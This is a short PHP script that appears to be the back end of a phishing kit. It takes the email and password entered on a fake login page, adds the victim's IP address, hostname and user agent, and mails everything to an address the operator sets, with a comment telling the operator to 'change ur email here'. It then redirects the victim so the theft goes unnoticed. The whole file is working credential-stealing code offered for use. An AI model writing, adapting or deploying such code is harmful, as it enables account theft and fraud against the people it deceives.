<?php
if($_POST["email"] != "" and $_POST["pass"] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "---------=Online Info=---------\n";
$message .= "User Name: ".$_POST['email']."\n";
$message .= "Password:  ".$_POST['pass']."\n";
$message .= "---------=IP Address & Date=---------\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|-----------BURHAN FUDPAGES [.] RU --------------|\n";
//change ur email here
include 'email.php';
$subject = "Login | $ip";
{
mail("$to", "$subject", $message);   
}
$praga=rand();
$praga=md5($praga);
  header ("Location: surf1.php?email=".$_POST['email']);
}else{
header ("Location: index.php");
}

?>